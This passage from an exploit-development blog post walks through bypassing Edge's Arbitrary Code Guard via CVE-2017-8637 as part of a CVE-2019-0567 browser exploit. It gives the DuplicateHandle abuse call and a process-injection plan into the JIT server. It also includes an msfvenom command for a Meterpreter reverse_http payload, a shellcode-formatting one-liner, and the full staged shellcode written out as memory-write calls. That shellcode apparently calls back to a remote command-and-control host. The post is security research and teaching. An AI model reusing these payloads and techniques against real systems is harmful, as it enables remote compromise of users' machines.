Another way to confirm this is by clicking on the `General` tab of our content process (PID `4172`). From there, we can click on the `Details` button next to `Mitigation policies` to confirm that ACG (called "Dynamic code prohibited" here) is enabled for the content process where our exploit is running.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion57.png" alt="">

However, if we look at the _other_ content process (which should be our JIT server) we can confirm ACG is _not_ running. Thus, indicating, we know exactly which process is our JIT server and which one is our content process. From now on, no matter how many instances of Edge are running on a given machine, a content process will always have a `PROCESS_DUP_HANDLE` handle to the JIT server located at `chakra::JITManager::s_jitManager+0x8`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion58.png" alt="">

So, in summation, we know that `s_jitManager+0x8` contains a handle to the JIT server, and it is readable from the content process (where our exploit is running). You may also be asking "why does the content process need to have a `PROCESS_DUP_HANDLE` handle to the JIT server?" We will come to this shortly.

Turning our attention back to the aforementioned analysis, we know we have a handle to the JIT server. You may be thinking - we could essentially just use our arbitrary read primitive to obtain this handle and then use it to perform some operations on the JIT process, since the JIT process _doesn't_ have ACG enabled! This may sound very enticing at first. However, let's take a look at a malicious function like `VirtualAllocEx` for a second, which can allocate memory within a remote process via a supplied process handle (which we have). `VirtualAllocEx` [documentation](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) states that:

> The handle must have the `PROCESS_VM_OPERATION` access right. For more information, see Process Security and Access Rights.

This "kills" our idea in its tracks - the handle we have only has the permission `PROCESS_DUP_HANDLE`. We don't have the access rights to allocate memory in a remote process where perhaps ACG is disabled (like the JIT server). However, due to a vulnerability (CVE-2017-8637), there is actually a way we can abuse the handle stored within `s_jitManager+0x8` (which is a handle to the JIT server). To understand this, let's just take a few moments to understand _why_ we even need a handle to the JIT server, from the content process, in the first place.

Let's now turn out attention to this [this](https://bugs.chromium.org/p/project-zero/issues/detail?id=1299) Google Project Zero issue regarding the CVE.

We know that the JIT server (a different process) needs to map JIT'd code into the content process. As the issue explains:

> In order to be able to map executable memory in the calling process, JIT process needs to have a handle of the calling process. So how does it get that handle? It is sent by the calling process as part of the `ThreadContext` structure. In order to send its handle to the JIT process, the calling process first needs to call `DuplicateHandle` on its (pseudo) handle.

The above is self explanatory. If you want to do process injection (e.g. map code into _another_ process) you need a handle to that process. So, in the case of the JIT server - the JIT server knows it is going to need to inject some code into the content process. In order to do this, the JIT server needs a handle to the content process with permissions such as `PROCESS_VM_OPERATION`. So, in order for the JIT process to have a handle to the content process, the content process (as mentioned above) shares it with the JIT process. However, this is where things get interesting. 

The way the content process will give its handle to the JIT server is by duplicating its own pseudo handle. According to Microsoft, a pseudo handle:

> ... is a special constant, currently `(HANDLE)-1`, that is interpreted as the current process handle.

So, in other words, a pseudo handle is a handle to the current process and it is _only_ valid within context of the process it is generated in. So, for example, if the content process called `GetCurrentProcess` to obtain a pseudo handle which represents the content process (essentially a handle to itself), this pseudo handle wouldn't be valid within the JIT process. This is because the pseudo handle only represents a handle to the process which called `GetCurrentProcess`. If `GetCurrentProcess` is called in the JIT process, the handle generated is only valid within the JIT process. It is just an "easy" way for a process to specify a handle to the current process. If you supplied this pseudo handle in a call to `WriteProcessMemory`, for instance, you would tell `WriteProcessMemory` "hey, any memory you are about to write to is found within the current process". Additionally, this pseudo handle has `PROCESS_ALL_ACCESS` permissions.

Now that we know what a pseudo handle is, let's revisit this sentiment:

> The way the content process will give its handle to the JIT server is by duplicating its own pseudo handle.

What the content process will do is obtain its pseudo handle by calling `GetCurrentProcess` (which is only valid within the content process). This handle is then used in a call to `DuplicateHandle`. In other words, the content process will duplicate its pseudo handle. You may be thinking, however, "Connor you just told me that a pseudo handle can only be used by the process which called `GetCurrentProcess`. Since the content process called `GetCurrentProcess`, the pseudo handle will only be valid in the content process. We need a handle to the content process that can be used by another process, like the JIT server. How does duplicating the handle change the fact this pseudo handle can't be shared outside of the content process, even though we are duplicating the handle?"

The answer is pretty straightforward - if we look in the `GetCurrentProcess` [Remarks](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess#remarks) section we can see the following text:

> A process can create a "real" handle to itself that is valid in the context of other processes, or that can be inherited by other processes, by specifying the pseudo handle as the source handle in a call to the `DuplicateHandle` function.

So, even though the pseudo handle only represents a handle to the current process and is only valid within the current process, the `DuplicateHandle` function has the ability to convert this pseudo  handle, which is only valid within the current process (in our case, the current process is the content process where the pseudo handle to be duplicated exists) into an _actual_ or _real_ handle which can be leveraged by other processes. This is exactly why the content process will duplicate its pseudo handle - it allows the content process to create an _actual_ handle to itself, with `PROCESS_ALL_ACCESS` permissions, which can be actively used by other processes (in our case, this duplicated handle can be used by the JIT server to map JIT'd code into the content process).

So, in totality, it's possible for the content process to call `GetCurrentProcess` (which returns a `PROCESS_ALL_ACCESS` handle to the content process) and then use `DuplicateHandle` to duplicate this handle for the JIT server to use. However, where things get interesting is the third parameter of `DuplicateHandle`, which is `hTargetProcessHandle`. This parameter has the following description:

> A handle to the process that is to receive the duplicated handle. The handle must have the `PROCESS_DUP_HANDLE` access right...

In our case, we know that the "process that is to receive the duplicated handle" is the JIT server. After all, we are trying to send a (duplicated) content process handle to the JIT server. This means that when the content process calls `DuplicateHandle` in order to duplicate its handle for the JIT server to use, according to this parameter, the JIT server _also_ needs to have a handle to the content process with `PROCESS_DUP_HANDLE`. If this doesn't make sense, re-read the description provided of `hTargetProcessHandle`. This is saying that this parameter requires a handle to the process where the duplicated handle is going to go (specifically a handle with `PROCESS_DUP_HANDLE`) permissions.

This means, in less words, that if the content process wants to call `DuplicateHandle` in order to send/share its handle to/with the JIT server so that the JIT server can map JIT'd code into the content process, the content process _also_ needs a `PROCESS_DUP_HANDLE` to the JIT server.

This is the exact reason why the `s_jitManager` structure in the content process contains a `PROCESS_DUP_HANDLE` to the JIT server. Since the content process now has a `PROCESS_DUP_HANDLE` handle to the JIT server (`s_jitManager+0x8`), this `s_jitManager+0x8` handle can be passed in to the `hTargetProcessHandle` parameter when the content process duplicates its handle via `DuplicateHandle` for the JIT server to use. So, to answer our initial question - the reason why this handle exists (why the content process has a handle to the JIT server) is so `DuplicateHandle` calls succeed where content processes need to send their handle to the JIT server!

As a point of contention, this architecture is no longer used and the issue was fixed [according](https://github.com/google/p0tools/blob/master/JITServer/JIT-Server-whitepaper.pdf) to Ivan:

> This issue was fixed by using an undocumented system_handle IDL attribute to transfer the Content Process handle to the JIT Process. This leaves handle passing in the responsibility of the Windows RPC mechanism, so Content Process no longer needs to call `DuplicateHandle()` or have a handle to the JIT Process.

So, to beat this horse to death, let me concisely reiterate one last time:

1. JIT process wants to inject JIT'd code into the content process. It needs a handle to the content process to inject this code
2. In order to fulfill this need, the content process will duplicate its handle and pass it to the JIT server
3. In order for a duplicated handle from process "A" (the content process) to be used by process "B" (the JIT server), process "B" (the JIT server) first needs to give its handle to process "A" (the content process) with `PROCESS_DUP_HANDLE` permissions. This is outlined by `hTargetProcessHandle` which requires "a handle to the process that is to receive the duplicated handle" when the content process calls `DuplicateHandle` to send its handle to the JIT process
4. Content process first stores a handle to the JIT server with `PROCESS_DUP_HANDLE` to fulfill the needs of `hTargetProcessHandle`
5. Now that the content process has a `PROCESS_DUP_HANDLE` to the JIT server, the content process can call `DuplicateHandle` to duplicate its own handle and pass it to the JIT server
6. JIT server now has a handle to the content process

The issue with this is number three, as [outlined by Microsoft](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights):

> A process that has some of the access rights noted here can use them to gain other access rights. For example, if process A has a handle to process B with `PROCESS_DUP_HANDLE` access, it can duplicate the pseudo handle for process B. This creates a handle that has maximum access to process B. For more information on pseudo handles, see `GetCurrentProcess`.

What Microsoft is saying here is that if a process has a handle to another process, and that handle has `PROCESS_DUP_HANDLE` permissions, it is possible to use _another_ call to `DuplicateHandle` to obtain a full-fledged `PROCESS_ALL_ACCESS` handle. This is the exact scenario we currently have. Our content process has a `PROCESS_DUP_HANDLE` handle to the JIT process. As Microsoft points out, this can be dangerous because it is possible to call `DuplicateHandle` on this `PROCESS_DUP_HANDLE` handle in order to obtain a full-access handle to the JIT server! This would allow us to have the necessary handle permissions, as we showed earlier with `VirtualAllocEx`, to compromise the JIT server. The reason why CVE-2017-8637 is an ACG bypass is because the JIT server doesn't have ACG enabled! If we, from the content process, can allocate memory and write shellcode into the JIT server (abusing this handle) we would compromise the JIT process and execute code, because ACG isn't enabled there!

So, we could setup a call to `DuplicateHandle` as such:

```c
DuplicateHandle(
	jitHandle,		// Leaked from s_jitManager+0x8 with PROCESS_DUP_HANDLE permissions
	GetCurrentProcess(),	// Pseudo handle to the current process
	GetCurrentProcess(),	// Pseudo handle to the current process
	&fulljitHandle,		// Variable we supply that will receive the PROCESS_ALL_ACCESS handle to the JIT server
	0,			// Ignored since we later specify DUPLICATE_SAME_ACCESS
	0,			// FALSE (handle can't be inherited)
	DUPLICATE_SAME_ACCESS	// Create handle with same permissions as source handle (source handle = GetCurrentProcessHandle() so PROCESS_ALL_ACCESS permissions)
);
```

Let's talk about where these parameters came from.

1. `hSourceProcessHandle` - "A handle to the process with the handle to be duplicated. The handle must have the `PROCESS_DUP_HANDLE` access right."
- The value we are passing here is `jitHandle` (which represents our `PROCESS_DUP_HANDLE` to the JIT server). As the parameter description says, we pass in the handle to the process where the "handle we want to duplicate exists". Since we are passing in the `PROCESS_DUP_HANDLE` to the JIT server, this essentially tells `DuplicateHandle` that the handle we want to duplicate exists somewhere within this process (the JIT process).

2. `hSourceHandle` - "The handle to be duplicated. This is an open object handle that is valid in the context of the source process."
- We supply a value of `GetCurrentProcess` here. What this means is that we are asking `DuplicateHandle` to duplicate a pseudo handle to the current process. In other words, we are asking `DuplicateHandle` to duplicate us a `PROCESS_ALL_ACCESS` handle. However, since we have passed in the JIT server as the `hSourceProcessHandle` parameter we are instead asking `DuplicateHandle` to "duplicate us a pseudo handle for the current process", but we have told `DuplicateHandl` that our "current process" is the JIT process as we have changed our "process context" by telling `DuplicateHandle` to perform this operation in context of the JIT process. Normally `GetCurrentProcess` would return us a handle to the process in which the function call occurred in (which, in our exploit, will obviously happen within a ROP chain in the content process). However, we use the "trick" up our sleeve, which is the leaked handle to the JIT server we have stored in the content process. When we supply this handle, we "trick" `DuplicateHandle` into essentially duplicating a `PROCESS_ALL_ACCESS` handle within the JIT process instead.

3. `hTargetProcessHandle` - "A handle to the process that is to receive the duplicated handle. The handle must have the `PROCESS_DUP_HANDLE` access right."
- We supply a value of `GetCurrentProcess` here. This makes sense, as we want to receive the full handle to the JIT server within the content process. Our exploit is executing within the content process so we tell `DuplicateHandle` that the process we want to receive this handle in context of is the current, or content process. This will allow the content process to use it later.

4. `lpTargetHandle` - "A pointer to a variable that receives the duplicate handle. This handle value is valid in the context of the target process. If `hSourceHandle` is a pseudo handle returned by `GetCurrentProcess` or `GetCurrentThread`, `DuplicateHandle` converts it to a real handle to a process or thread, respectively."
- This is the most important part. Not only is this the variable that will receive our handle (`fulljitHandle` just represents a memory address where we want to store this handle. In our exploit we will just find an empty `.data` address to store it in), but the second part of the parameter description is equally as important. We know that for `hSourceHandle` we supplied a pseudo handle via `GetCurrentProcess`. This description essentially says that `DuplicateHandle` will convert this pseudo handle in `hSourceHandle` into a _real_ handle when the function completes. As we mentioned, we are using a "trick" with our `hSourceProcessHandle` being the JIT server and our `hSourceHandle` being a pseudo handle. We, as mentioned, are telling Edge to search within the JIT process for a pseudo handle "to the current process", which is the JIT process. However, a pseudo handle would really only be usable in context of the process where it was being obtained from. So, for instance, if we obtained a pseudo handle to the JIT process it would _only_ be usable within the JIT process. This isn't ideal, because our exploit is within the content process and any handle that is only usable within the JIT process itself is useless to us. However, since `DuplicateHandle` will convert the pseudo handle to a _real_ handle, this _real_ handle is usable by other processes. This essentially means our call to `DuplicateHandle` will provide us with an _actual_ handle with `PROCESS_ALL_ACCESS` to the JIT server from another process (from the content process in our case).

5. `dwDesiredAccess` - "The access requested for the new handle. For the flags that can be specified for each object type, see the following Remarks section. This parameter is ignored if the `dwOptions` parameter specifies the `DUPLICATE_SAME_ACCESS` flag..."
- We will be supplying the `DUPLICATE_SAME_ACCESS` flag later, meaning we can set this to `0`.

6. `bInheritHandle` - "A variable that indicates whether the handle is inheritable. If TRUE, the duplicate handle can be inherited by new processes created by the target process. If FALSE, the new handle cannot be inherited."
- Here we set the value to FALSE. We don't want to/nor do we care if this handle is inheritable.

7. `dwOptions` - "Optional actions. This parameter can be zero, or any combination of the following values."
- Here we provide `2`, or `DUPLICATE_SAME_ACCESS`. This instructs `DuplicateHandle` that we want our duplicate handle to have the same permissions as the handle provided by the source. Since we provided a pseudo handle as the source, which has `PROCESS_ALL_ACCESS`, our final duplicated handle `fulljitHandle` will have a _real_ `PROCESS_ALL_ACCESS` handle to the JIT server which can be used by the content process.

If this all sounds confusing, take a few moments to keep reading the above. Additionally, here is a summation of what I said:
1. `DuplicateHandle` let's you decide in what process the handle you want to duplicate exists. We tell `DuplicateHandle` that we want to duplicate a handle within the JIT process, using the low-permission `PROCESS_DUP_HANDLE` handle we have leaked from `s_jitManager`.
2. We then tell `DuplicateHandle` the handle we want to duplicate within the JIT server is a `GetCurrentProcess` pseudo handle. This handle has `PROCESS_ALL_ACCESS`
3. Although `GetCurrentProcess` returns a handle only usable by the process which called it, `DuplicateHandle` will perform a conversion under the hood to convert this to an _actual_ handle which other processes can use
4. Lastly, we tell `DuplicateHandle` we want a real handle to the JIT server, which we can use from the content process, with `PROCESS_ALL_ACCESS` permissions via the `DUPLICATE_SAME_ACCESS` flag which will tell `DuplicateHandle` to duplicate the handle with the same permissions as the pseudo handle (which is `PROCESS_ALL_ACCESS`).

Again, just keep re-reading over this and thinking about it logically. If you still have questions, feel free to email me. It can get confusing pretty quickly (at least to me).

Now that we are armed with the above information, it is time to start outline our exploitation plan.

Exploitation Plan 2.0
---
Let's briefly take a second to rehash where we are at:

1. We have an ASLR bypass and we know the layout of memory
2. We can read/write anywhere in memory as much or as little as we want
3. We can direct program execution to wherever we want in memory
4. We know where the stack is and can force Edge to start executing our ROP chain

However, we know the pesky mitigations of ACG, CIG, and "no child processes" are still in our way. We can't just execute our payload because we can't make our payload as executable. So, with that said, the first option one could take is using a pure data-only attack. We could programmatically, via ROP, build out a reverse shell. This is very cumbersome and could take thousands of ROP gadgets. Although this is _always_ a viable alternative, we want to detonate actual shellcode somehow. So, the approach we will take is as follows:

1. Abuse CVE-2017-8637 to obtain a `PROCESS_ALL_ACCESS` handle to the JIT process
2. ACG is disabled within the JIT process. Use our ability to execute a ROP chain in the content process to write our payload to the JIT process
3. Execute our payload within the JIT process to obtain shellcode execution (essentially perform process injection to inject a payload to the JIT process where ACG is disabled)

To break down how we will actually accomplish step 2 in even greater detail, let's first outline some stipulations about processes protected by ACG. We know that the content process (where our exploit will execute) is protected by ACG. We know that the JIT server is _not_ protected by ACG. We already know that a process not protected by ACG is allowed to inject into a process that is protected by ACG. We clearly see this with the out-of-process JIT architecture of Edge. The JIT server (not protected by ACG) injects code into the content process (protected by ACG) - this is expected behavior. However, what about a injection from a process that _is_ protected by ACG into a process that is _not_ protected by ACG (e.g. injection from the content process into the JIT process, which we are attempting to do)?

This is actually prohibited (with a slight caveat). A process that is protected by ACG is not allowed to directly inject RWX memory and execute it within a process not protected by ACG. This makes sense, as this stipulation "protects" against an attacker compromising the JIT process (ACG disabled) from the content process (ACG enabled). However, we mentioned the stipulation is only that we cannot _directly_ embed our shellcode as RWX memory and directly execute it via a process injection call stack like `VirtualAllocEx` (allocate RWX memory within the JIT process) -> `WriteProcessMemory` -> `CreateRemoteThread` (execute the RWX memory in the JIT process). However, there is a way we can bypass this stipulation.

Instead of directly allocating RWX memory within the JIT process (from the content process) we could instead just write a ROP chain into the JIT process. This doesn't require RWX memory, and only requires RW memory. Then, if we could somehow hijack control-flow of the JIT process, we could have the JIT process execute our ROP chain. Since ACG is disabled in the JIT process, our ROP chain could mark our shellcode as RWX instead of directly doing it via `VirtualAllocEx`! Essentially, our ROP chain would just be a "traditional" one used to bypass DEP in the JIT process. This would allow us to bypass ACG! This is how our exploit chain would look:

1. Abuse CVE-2017-8637 to obtain a `PROCESS_ALL_ACCESS` handle to the JIT process (this allows us to invoke memory operations on the JIT server from the content process)
2. Allocate memory within the JIT process via `VirtualAllocEx` and the above handle
3. Write our final shellcode (a reflective DLL from Meterpreter) into the allocation (our shellcode is now in the JIT process as RW)
4. Create a thread within the JIT process via `CreateRemoteThread`, but create this thread as _suspended_ so it doesn't execute and have the start/entry point of our thread be a `ret` ROP gadget
5. Dump the `CONTEXT` structure of the thread we just created (and now control) in the JIT process via `GetThreadContext` to retrieve its stack pointer (RSP)
6. Use `WriteProcessMemory` to write the "final" ROP chain into the JIT process by leveraging the leaked stack pointer (RSP) of the thread we control in the JIT process from our call to `GetThreadContext`. Since we know where the stack is for our thread we created, from `GetThreadContext`, we can directly write a ROP chain to it with `WriteProcessMemory` and our handle to the JIT server. This ROP chain will mark our shellcode, which we already injected into the JIT process, as RWX (this ROP chain will work just like any traditional ROP chain that calls `VirtualProtect`)
7. Update the instruction pointer of the thread we control to return into our ROP chains
8. Call `ResumeThread`. This call will kick off execution of our thread, which has its entry point set to a return routine to start executing off of the stack, where our ROP chain is
9. Our ROP chain will mark our shellcode as RWX and will jump to it and execute it

Lastly, I want to quickly point out the old [Advanced Windows Exploitation syllabus](https://web.archive.org/web/20190909204906/https://www.offensive-security.com/documentation/advanced-windows-exploitation.pdf) from Offensive Security. After reading the steps outlined in this syllabus, I was able to formulate my aforementioned exploitation path off of the ground work laid here. As this blog post continues on, I will explain some of the things I thought would work at first and how the above exploitation path actually came to be. Although the syllabus I read was succinct and concise, I learned as I developing my exploit some additional things Control Flow Guard checks which led to many more ROP chains than I would have liked. As this blog post goes on, I will explain my thought process as to what I _thought_ would work and what _actually_ worked. 

If the above steps seem a bit confusing - do not worry. We will dedicate a section to each concept in the rest of the blog post. You have gotten through a wall of text and, if you have made it to this point, you should have a general understanding of what we are trying to accomplish. Let's now start implementing this into our exploit. We will start with our shellcode.

Shellcode
---
The first thing we need to decide is what kind of shellcode we want to execute. What we will do is store our shellcode in the `.data` section of `chakra.dll` within the content process. This is so we know its location when it comes time to inject it into the JIT process. So, before we begin our ROP chain, we need to load our shellcode into the content process so we can inject it into the JIT process. A typical example of a reverse shell, on Windows, is as follows:

1. Create an instance of `cmd.exe`
2. Using the socket library of the Windows API to put the I/O for `cmd.exe` on a socket, making the `cmd.exe` session remotely accessible over a network connection.

We can see this within the [Metasploit Framework](https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/external/source/shellcode/windows/x64/src/single/single_shell_reverse_tcp.asm)

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion59.png" alt="">

Here is the issue - within Edge, we know there is a "no child processes" mitigation. Since a reverse shell requires spawning an instance of `cmd.exe` from the code calling it (our exploit), we can't just use a normal reverse shell. Another way we could load code into the process space is through a DLL. However, remember that even though ACG is disabled in the JIT process, the JIT process still has Code Integrity Guard (CIG) enabled - meaning we can't just use our payload to download a DLL to disk and then load it with `LoadLibraryA`. However, let's take a further look at CIG's documentation. Specifically regarding the [Mitigation Bypass and Bounty for Defense Terms](https://www.microsoft.com/en-us/msrc/bounty-mitigation-bypass?rtc=1). If we scroll down to the "Code integrity mitigations", we can take a look at what Microsoft deems to be out-of-scope.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion60.png" alt="">

If the image above is hard to view, open it in a new tab. As we can see Microsoft says that "in-memory injection" is out-of-scope of bypassing CIG. This means Microsoft knows this is an issue that CIG doesn't address. There is a well-known technique known as [reflective DLL injection](https://github.com/stephenfewer/ReflectiveDLLInjection) where an adversary can use pure shellcode (a very large blob of shellcode) in order to load an entire DLL (which is unsigned by Microsoft) in memory, without ever touching disk. Red teamers have beat this concept to death, so I am not going to go in-depth here. Just know that we need to use reflective DLL because we need a payload which doesn't spawn other processes.

Most command-and-control frameworks, like the one we will use (Meterpreter), use reflective DLL for their post-exploitation capabilities. There are two ways to approach this - staged and stageless. Stageless payloads will be a huge blob of shellcode that not only contain the DLL itself, but a routine that injects that DLL into memory. The other alternative is a staged payload - which will use a small first-stage shellcode which calls out to a command-and-control server to fetch the DLL itself to be injected. For our purposes, we will be using a staged reflective DLL for our shellcode.

To be more simple - we will be using the `windows/meterpreter/x64/reverse_http` payload from Metasploit. Essentially you can opt for any shellcode to be injected which doesn't fork a new process.

The shellcode can be generated as follows: `msfvenom -p windows/x64/meterpreter/reverse_http LHOST=YOUR_SERVER_IP LPORT=443 -f c`

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion61.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion62.png" alt="">

What I am about to explain next is (arguably) the most arduous part of this exploit. We know that in our exploit JavaScript limits us to 32-bit boundaries when reading and writing. So, this means we have to write our shellcode 4 bytes at a time. So, in order to do this, we need to divide up our exploit into 4-byte "segments". I did this manually, but later figured out how to slightly automate getting the shellcode correct.

To "automate" this, we first need to get our shellcode into one contiguous line. Save the shellcode from the `msfvenom` output in a file named `shellcode.txt`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion63.png" alt="">

Once the shellcode is in `shellcode.txt`, we can use the following one liner:

```bash
awk '{printf "%s""",$0}' shellcode.txt | sed 's/"//g' | sed 's/;//g' | sed 's/$/0000/' |  sed -re 's/\\x//g1' | fold -w 2 | tac | tr -d "\n" | sed 's/.\{8\}/& /g' | awk '{ for (i=NF; i>1; i--) printf("%s ",$i); print $1; }' | awk '{ for(i=1; i<=NF; i+=2) print $i, $(i+1) }' | sed 's/ /, /g' | sed 's/[^ ]* */0x&/g' | sed 's/^/write64(chakraLo+0x74b000+countMe, chakraHigh, /' | sed 's/$/);/' | sed 's/$/\ninc();/'
```

This will take our shellcode and divide it into four byte segments, remove the `\x` characters, get them in little endian format, and put them in a format where they will more easily be ready to be placed into our exploit.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion64.png" alt="">

Your output should look something like this:

```javascript
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xe48348fc, 0x00cce8f0);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x51410000, 0x51525041);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x56d23148, 0x528b4865);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x528b4860, 0x528b4818);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc9314d20, 0x50728b48);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4ab70f48, 0xc031484a);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x7c613cac, 0x41202c02);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x410dc9c1, 0xede2c101);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x528b4852, 0x8b514120);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x01483c42, 0x788166d0);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0f020b18, 0x00007285);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x88808b00, 0x48000000);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x6774c085, 0x44d00148);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5020408b, 0x4918488b);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x56e3d001, 0x41c9ff48);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4d88348b, 0x0148c931);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc03148d6, 0x0dc9c141);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc10141ac, 0xf175e038);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x244c034c, 0xd1394508);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4458d875, 0x4924408b);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4166d001, 0x44480c8b);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x491c408b, 0x8b41d001);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x01488804, 0x415841d0);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5a595e58, 0x59415841);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x83485a41, 0x524120ec);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4158e0ff, 0x8b485a59);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xff4be912, 0x485dffff);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4953db31, 0x6e6977be);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x74656e69, 0x48564100);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc749e189, 0x26774cc2);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53d5ff07, 0xe1894853);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x314d5a53, 0xc9314dc0);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xba495353, 0xa779563a);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x0ee8d5ff);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x31000000, 0x312e3237);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x35352e36, 0x3539312e);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89485a00, 0xc0c749c1);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x000001bb, 0x53c9314d);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53036a53, 0x8957ba49);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0000c69f, 0xd5ff0000);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x000023e8, 0x2d652f00);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x65503754, 0x516f3242);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x58643452, 0x6b47336c);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x67377674, 0x4d576c79);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x3764757a, 0x0078466a);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53c18948, 0x4d58415a);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4853c931, 0x280200b8);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000084, 0x53535000);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xebc2c749, 0xff3b2e55);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc68948d5, 0x535f0a6a);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xf189485a, 0x4dc9314d);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5353c931, 0x2dc2c749);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xff7b1806, 0x75c085d5);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc1c7481f, 0x00001388);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xf044ba49, 0x0000e035);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xd5ff0000, 0x74cfff48);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xe8cceb02, 0x00000055);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x406a5953, 0xd189495a);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4910e2c1, 0x1000c0c7);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xba490000, 0xe553a458);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x9348d5ff);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89485353, 0xf18948e7);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x49da8948, 0x2000c0c7);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89490000, 0x12ba49f9);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00e28996, 0xff000000);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc48348d5, 0x74c08520);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x078b66b2, 0x85c30148);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x58d275c0, 0x006a58c3);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc2c74959, 0x56a2b5f0);
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0000d5ff, );
inc();
```

Notice at the last line, we are missing 4 bytes. We can add some `NULL` padding (`NULL` bytes don't affect us because we aren't dealing with C-style strings). We need to update our last line as follows:

```javascript
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x0000d5ff);
inc();
```

Let's take just one second to breakdown why the shellcode is formatted this way. We can see that our write primitive starts writing this shellcode to `chakra_base + 0x74b000`. If we take a look at this address within WinDbg we can see it is "empty".

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion65.png" alt="">

This address comes from the `.data` section of `chakra.dll` - meaning it is RW memory that we can write our shellcode to. As we have seen time and time again, the `!dh chakra` command can be used to see where the different headers are located at. Here is how our exploit looks now:

```html
<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// CVE-2019-0567: Microsoft Edge Type Confusion
// Author: Connor McGarr (@33y0re)

// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
